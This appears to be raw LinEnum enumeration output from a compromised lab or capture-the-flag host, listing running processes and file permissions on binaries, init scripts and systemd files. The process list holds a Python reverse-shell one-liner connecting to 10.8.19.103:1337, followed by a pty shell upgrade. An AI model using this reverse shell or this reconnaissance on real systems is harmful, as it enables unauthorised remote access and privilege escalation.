root       616  0.0  0.5  16124  2520 ?        Ss   17:31   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
mysql      680  0.0 26.3 1114364 131208 ?      Ssl  17:31   0:05 /usr/sbin/mysqld
root       691  0.0  1.2  65512  5980 ?        Ss   17:31   0:00 /usr/sbin/sshd -D
root       714  0.0  3.2 258264 16432 ?        Ss   17:31   0:00 /usr/sbin/apache2 -k start
www-data   733  0.0  1.3 258732  6588 ?        S    17:31   0:00 /usr/sbin/apache2 -k start
root       887  0.0  0.0      0     0 ?        S    17:45   0:00 [kworker/0:0]
www-data   949  0.0  1.3 258724  6588 ?        S    17:54   0:00 /usr/sbin/apache2 -k start
www-data   965  0.0  1.3 258724  6576 ?        S    17:54   0:00 /usr/sbin/apache2 -k start
www-data   969  0.0  1.3 258724  6572 ?        S    17:56   0:00 /usr/sbin/apache2 -k start
www-data   999  0.0  1.3 258724  6584 ?        S    17:56   0:00 /usr/sbin/apache2 -k start
www-data  1012  0.0  1.3 258724  6576 ?        S    17:56   0:00 /usr/sbin/apache2 -k start
www-data  1020  0.0  1.3 258724  6572 ?        S    17:56   0:00 /usr/sbin/apache2 -k start
www-data  1025  0.0  1.3 258724  6604 ?        S    17:56   0:00 /usr/sbin/apache2 -k start
www-data  1026  0.0  1.3 258724  6576 ?        S    17:56   0:00 /usr/sbin/apache2 -k start
www-data  1029  0.0  1.4 258724  7028 ?        S    17:56   0:00 /usr/sbin/apache2 -k start
www-data  1263  0.0  0.1   4504   740 ?        S    19:15   0:00 sh -c python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
www-data  1264  0.0  1.4  39932  7128 ?        S    19:15   0:00 python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
www-data  1265  0.0  0.1   4504   836 ?        S    19:15   0:00 /bin/sh -i
www-data  1267  0.0  1.5  35824  7952 ?        S    19:16   0:00 python3 -c import pty;pty.spawn("/bin/bash")
www-data  1268  0.0  0.6  18236  3208 pts/0    Ss+  19:16   0:00 /bin/bash
root      1285  0.0  0.0      0     0 ?        S    19:17   0:00 [kworker/0:2]
root      1312  0.0  1.3  92836  6720 ?        Ss   19:26   0:00 sshd: pingu [priv]
pingu     1315  0.0  0.9  45280  4596 ?        Ss   19:26   0:00 /lib/systemd/systemd --user
root      1316  0.0  0.0      0     0 ?        S    19:26   0:00 [kworker/0:1]
pingu     1318  0.0  0.3  61280  1728 ?        S    19:26   0:00 (sd-pam)
root      1320  0.0  0.0      0     0 ?        S    19:26   0:00 [kworker/0:3]
pingu     1341  0.0  0.6  92836  3248 ?        S    19:26   0:00 sshd: pingu@pts/1
pingu     1342  0.0  1.0  22472  4984 pts/1    Ss   19:26   0:00 -bash
pingu     1359  0.0  0.7  13508  3816 pts/1    S+   19:30   0:00 /bin/bash ./LinEnum.sh
pingu     1360  0.0  0.6  13552  3344 pts/1    S+   19:30   0:00 /bin/bash ./LinEnum.sh
pingu     1361  0.0  0.1   7296   664 pts/1    S+   19:30   0:00 tee -a
pingu     1549  0.0  0.5  13536  2772 pts/1    S+   19:30   0:00 /bin/bash ./LinEnum.sh
pingu     1550  0.0  0.6  37364  3296 pts/1    R+   19:30   0:00 ps aux

[-] Process binaries and associated permissions (from above list):
1016K -rwxr-xr-x 1 root root 1014K May 16  2017 /bin/bash
    0 lrwxrwxrwx 1 root root     4 Jan 15  2020 /bin/sh -> dash
 1.6M -rwxr-xr-x 1 root root  1.6M Feb 13  2019 /lib/systemd/systemd
 320K -rwxr-xr-x 1 root root  319K Feb 13  2019 /lib/systemd/systemd-journald
 608K -rwxr-xr-x 1 root root  605K Feb 13  2019 /lib/systemd/systemd-logind
 140K -rwxr-xr-x 1 root root  139K Feb 13  2019 /lib/systemd/systemd-timesyncd
 444K -rwxr-xr-x 1 root root  443K Feb 13  2019 /lib/systemd/systemd-udevd
  44K -rwxr-xr-x 1 root root   44K May 16  2018 /sbin/agetty
 476K -rwxr-xr-x 1 root root  476K Mar  5  2018 /sbin/dhclient
    0 lrwxrwxrwx 1 root root    20 Jan 15  2020 /sbin/init -> /lib/systemd/systemd
 220K -rwxr-xr-x 1 root root  219K Jan 12  2017 /usr/bin/dbus-daemon
 164K -rwxr-xr-x 1 root root  162K Nov  3  2016 /usr/lib/accountsservice/accounts-daemon
 648K -rwxr-xr-x 1 root root  648K Oct  8  2019 /usr/sbin/apache2
  44K -rwxr-xr-x 1 root root   44K Apr  5  2016 /usr/sbin/cron
  24M -rwxr-xr-x 1 root root   24M Nov 15  2019 /usr/sbin/mysqld
 588K -rwxr-xr-x 1 root root  586K Apr  5  2016 /usr/sbin/rsyslogd
 776K -rwxr-xr-x 1 root root  773K Mar  4  2019 /usr/sbin/sshd

[-] /etc/init.d/ binary permissions:
total 264
drwxr-xr-x  2 root root 4096 Jan 15  2020 .
drwxr-xr-x 92 root root 4096 Jan 20  2020 ..
-rwxr-xr-x  1 root root 8087 Jun 11  2018 apache2
-rwxr-xr-x  1 root root 2210 Jun 11  2018 apache-htcacheclean
-rwxr-xr-x  1 root root 6223 Mar  3  2017 apparmor
-rwxr-xr-x  1 root root 1275 Jan 19  2016 bootmisc.sh
-rwxr-xr-x  1 root root 3807 Jan 19  2016 checkfs.sh
-rwxr-xr-x  1 root root 1098 Jan 19  2016 checkroot-bootclean.sh
-rwxr-xr-x  1 root root 9353 Jan 19  2016 checkroot.sh
-rwxr-xr-x  1 root root 1343 Apr  4  2016 console-setup
-rwxr-xr-x  1 root root 3049 Apr  5  2016 cron
-rwxr-xr-x  1 root root 2813 Dec  1  2015 dbus
-rw-r--r--  1 root root 1365 Jan 15  2020 .depend.boot
-rw-r--r--  1 root root  539 Jan 15  2020 .depend.start
-rw-r--r--  1 root root  709 Jan 15  2020 .depend.stop
-rwxr-xr-x  1 root root 1105 Apr 26  2019 grub-common
-rwxr-xr-x  1 root root 1336 Jan 19  2016 halt
-rwxr-xr-x  1 root root 1423 Jan 19  2016 hostname.sh
-rwxr-xr-x  1 root root 3809 Mar 12  2016 hwclock.sh
-rwxr-xr-x  1 root root 2372 Apr 11  2016 irqbalance
-rwxr-xr-x  1 root root 1804 Apr  4  2016 keyboard-setup
-rwxr-xr-x  1 root root 1300 Jan 19  2016 killprocs
-rwxr-xr-x  1 root root 2087 Dec 20  2015 kmod
-rwxr-xr-x  1 root root  703 Jan 19  2016 mountall-bootclean.sh
-rwxr-xr-x  1 root root 2301 Jan 19  2016 mountall.sh
-rwxr-xr-x  1 root root 1461 Jan 19  2016 mountdevsubfs.sh
-rwxr-xr-x  1 root root 1564 Jan 19  2016 mountkernfs.sh
-rwxr-xr-x  1 root root  711 Jan 19  2016 mountnfs-bootclean.sh
-rwxr-xr-x  1 root root 2456 Jan 19  2016 mountnfs.sh
-rwxr-xr-x  1 root root 5607 Feb  3  2017 mysql
-rwxr-xr-x  1 root root 4771 Jul 19  2015 networking
-rwxr-xr-x  1 root root 1581 Oct 15  2015 ondemand
-rwxr-xr-x  1 root root 1846 Mar 22  2018 open-vm-tools
-rwxr-xr-x  1 root root 1366 Nov 15  2015 plymouth
-rwxr-xr-x  1 root root  752 Nov 15  2015 plymouth-log
-rwxr-xr-x  1 root root 1192 Sep  5  2015 procps
-rwxr-xr-x  1 root root 6366 Jan 19  2016 rc
-rwxr-xr-x  1 root root  820 Jan 19  2016 rc.local
-rwxr-xr-x  1 root root  117 Jan 19  2016 rcS
-rw-r--r--  1 root root 2427 Jan 19  2016 README
-rwxr-xr-x  1 root root  661 Jan 19  2016 reboot
-rwxr-xr-x  1 root root 4149 Nov 23  2015 resolvconf
-rwxr-xr-x  1 root root 4355 Jul 10  2014 rsync
-rwxr-xr-x  1 root root 2796 Feb  3  2016 rsyslog
-rwxr-xr-x  1 root root 3927 Jan 19  2016 sendsigs
-rwxr-xr-x  1 root root  597 Jan 19  2016 single
-rw-r--r--  1 root root 1087 Jan 19  2016 skeleton
-rwxr-xr-x  1 root root 4077 Aug 21  2018 ssh
-rwxr-xr-x  1 root root 6087 Apr 12  2016 udev
-rwxr-xr-x  1 root root 2049 Aug  7  2014 ufw
-rwxr-xr-x  1 root root 2737 Jan 19  2016 umountfs
-rwxr-xr-x  1 root root 2202 Jan 19  2016 umountnfs.sh
-rwxr-xr-x  1 root root 1879 Jan 19  2016 umountroot
-rwxr-xr-x  1 root root 3111 Jan 19  2016 urandom
-rwxr-xr-x  1 root root 1306 May 16  2018 uuidd
-rwxr-xr-x  1 root root 2757 Jan 19  2017 x11-common

[-] /etc/init/ config file permissions:
total 132
drwxr-xr-x  2 root root 4096 Jan 15  2020 .
drwxr-xr-x 92 root root 4096 Jan 20  2020 ..
-rw-r--r--  1 root root 3709 Mar  3  2017 apparmor.conf
-rw-r--r--  1 root root  250 Apr  4  2016 console-font.conf
-rw-r--r--  1 root root  509 Apr  4  2016 console-setup.conf
-rw-r--r--  1 root root  297 Apr  5  2016 cron.conf
-rw-r--r--  1 root root  482 Sep  1  2015 dbus.conf
-rw-r--r--  1 root root 1247 Jun  1  2015 friendly-recovery.conf
-rw-r--r--  1 root root  284 Jul 23  2013 hostname.conf
-rw-r--r--  1 root root  300 May 21  2014 hostname.sh.conf
-rw-r--r--  1 root root  674 Mar 14  2016 hwclock.conf
-rw-r--r--  1 root root  561 Mar 14  2016 hwclock-save.conf
-rw-r--r--  1 root root  109 Mar 14  2016 hwclock.sh.conf
-rw-r--r--  1 root root  597 Apr 11  2016 irqbalance.conf
-rw-r--r--  1 root root  689 Aug 20  2015 kmod.conf
-rw-r--r--  1 root root 1757 Feb  3  2017 mysql.conf
-rw-r--r--  1 root root 2493 Jun  2  2015 networking.conf
-rw-r--r--  1 root root  933 Jun  2  2015 network-interface.conf
-rw-r--r--  1 root root  530 Jun  2  2015 network-interface-container.conf
-rw-r--r--  1 root root 1756 Jun  2  2015 network-interface-security.conf
-rw-r--r--  1 root root  568 Feb  1  2016 passwd.conf
-rw-r--r--  1 root root  119 Jun  5  2014 procps.conf
-rw-r--r--  1 root root  363 Jun  5  2014 procps-instance.conf
-rw-r--r--  1 root root  457 Jun  3  2015 resolvconf.conf
-rw-r--r--  1 root root  426 Dec  2  2015 rsyslog.conf
-rw-r--r--  1 root root  230 Apr  4  2016 setvtrgb.conf
-rw-r--r--  1 root root  641 Aug 21  2018 ssh.conf
-rw-r--r--  1 root root  337 Apr 12  2016 udev.conf
-rw-r--r--  1 root root  360 Apr 12  2016 udevmonitor.conf
-rw-r--r--  1 root root  352 Apr 12  2016 udevtrigger.conf
-rw-r--r--  1 root root  473 Aug  7  2014 ufw.conf
-rw-r--r--  1 root root  889 Feb 24  2015 ureadahead.conf
-rw-r--r--  1 root root  683 Feb 24  2015 ureadahead-other.conf

[-] /lib/systemd/* config file permissions:
/lib/systemd/:
total 8.3M
drwxr-xr-x 27 root root  12K Jan 15  2020 system
drwxr-xr-x  2 root root 4.0K Jan 15  2020 system-sleep
drwxr-xr-x  2 root root 4.0K Jan 15  2020 system-generators
drwxr-xr-x  2 root root 4.0K Jan 15  2020 system-preset
drwxr-xr-x  2 root root 4.0K Jan 15  2020 network
-rwxr-xr-x  1 root root 443K Feb 13  2019 systemd-udevd
-rwxr-xr-x  1 root root 268K Feb 13  2019 systemd-cgroups-agent
-rwxr-xr-x  1 root root 301K Feb 13  2019 systemd-fsck
-rwxr-xr-x  1 root root 276K Feb 13  2019 systemd-initctl
-rwxr-xr-x  1 root root 340K Feb 13  2019 systemd-localed
-rwxr-xr-x  1 root root  51K Feb 13  2019 systemd-modules-load
-rwxr-xr-x  1 root root  35K Feb 13  2019 systemd-user-sessions
-rwxr-xr-x  1 root root 1.6M Feb 13  2019 systemd
-rwxr-xr-x  1 root root  15K Feb 13  2019 systemd-ac-power
-rwxr-xr-x  1 root root 103K Feb 13  2019 systemd-bootchart
-rwxr-xr-x  1 root root  91K Feb 13  2019 systemd-cryptsetup
-rwxr-xr-x  1 root root  31K Feb 13  2019 systemd-hibernate-resume
-rwxr-xr-x  1 root root 332K Feb 13  2019 systemd-hostnamed
-rwxr-xr-x  1 root root 319K Feb 13  2019 systemd-journald
-rwxr-xr-x  1 root root 123K Feb 13  2019 systemd-networkd-wait-online
-rwxr-xr-x  1 root root  35K Feb 13  2019 systemd-quotacheck
-rwxr-xr-x  1 root root  51K Feb 13  2019 systemd-remount-fs
-rwxr-xr-x  1 root root  91K Feb 13  2019 systemd-rfkill
-rwxr-xr-x  1 root root 143K Feb 13  2019 systemd-shutdown
-rwxr-xr-x  1 root root  71K Feb 13  2019 systemd-sleep
-rwxr-xr-x  1 root root  91K Feb 13  2019 systemd-socket-proxyd
-rwxr-xr-x  1 root root  55K Feb 13  2019 systemd-sysctl
-rwxr-xr-x  1 root root 333K Feb 13  2019 systemd-timedated
-rwxr-xr-x  1 root root 139K Feb 13  2019 systemd-timesyncd
-rwxr-xr-x  1 root root  55K Feb 13  2019 systemd-activate
-rwxr-xr-x  1 root root  91K Feb 13  2019 systemd-backlight
-rwxr-xr-x  1 root root  47K Feb 13  2019 systemd-binfmt
-rwxr-xr-x  1 root root 352K Feb 13  2019 systemd-bus-proxyd
-rwxr-xr-x  1 root root  75K Feb 13  2019 systemd-fsckd
-rwxr-xr-x  1 root root 605K Feb 13  2019 systemd-logind
-rwxr-xr-x  1 root root 836K Feb 13  2019 systemd-networkd
-rwxr-xr-x  1 root root  39K Feb 13  2019 systemd-random-seed
-rwxr-xr-x  1 root root  31K Feb 13  2019 systemd-reply-password
-rwxr-xr-x  1 root root 657K Feb 13  2019 systemd-resolved
-rwxr-xr-x  1 root root 276K Feb 13  2019 systemd-update-utmp
-rwxr-xr-x  1 root root 1.3K Nov 15  2018 systemd-sysv-install
drwxr-xr-x  2 root root 4.0K Apr 12  2016 system-shutdown

/lib/systemd/system:
total 828K
drwxr-xr-x 2 root root 4.0K Jan 15  2020 apache2.service.d
drwxr-xr-x 2 root root 4.0K Jan 15  2020 halt.target.wants
drwxr-xr-x 2 root root 4.0K Jan 15  2020 initrd-switch-root.target.wants
drwxr-xr-x 2 root root 4.0K Jan 15  2020 kexec.target.wants
drwxr-xr-x 2 root root 4.0K Jan 15  2020 multi-user.target.wants
drwxr-xr-x 2 root root 4.0K Jan 15  2020 poweroff.target.wants
drwxr-xr-x 2 root root 4.0K Jan 15  2020 reboot.target.wants
drwxr-xr-x 2 root root 4.0K Jan 15  2020 sysinit.target.wants
drwxr-xr-x 2 root root 4.0K Jan 15  2020 sockets.target.wants
drwxr-xr-x 2 root root 4.0K Jan 15  2020 systemd-resolved.service.d
drwxr-xr-x 2 root root 4.0K Jan 15  2020 systemd-timesyncd.service.d
drwxr-xr-x 2 root root 4.0K Jan 15  2020 timers.target.wants
lrwxrwxrwx 1 root root   21 Jan 15  2020 udev.service -> systemd-udevd.service
lrwxrwxrwx 1 root root    9 Jan 15  2020 umountfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jan 15  2020 umountnfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jan 15  2020 umountroot.service -> /dev/null
lrwxrwxrwx 1 root root   27 Jan 15  2020 urandom.service -> systemd-random-seed.service
lrwxrwxrwx 1 root root    9 Jan 15  2020 x11-common.service -> /dev/null
lrwxrwxrwx 1 root root   17 Jan 15  2020 runlevel4.target -> multi-user.target
lrwxrwxrwx 1 root root   16 Jan 15  2020 runlevel5.target -> graphical.target
lrwxrwxrwx 1 root root   13 Jan 15  2020 runlevel6.target -> reboot.target
lrwxrwxrwx 1 root root    9 Jan 15  2020 sendsigs.service -> /dev/null
drwxr-xr-x 2 root root 4.0K Jan 15  2020 sigpwr.target.wants
lrwxrwxrwx 1 root root    9 Jan 15  2020 single.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jan 15  2020 stop-bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jan 15  2020 stop-bootlogd-single.service -> /dev/null
drwxr-xr-x 2 root root 4.0K Jan 15  2020 rescue.target.wants
drwxr-xr-x 2 root root 4.0K Jan 15  2020 resolvconf.service.wants
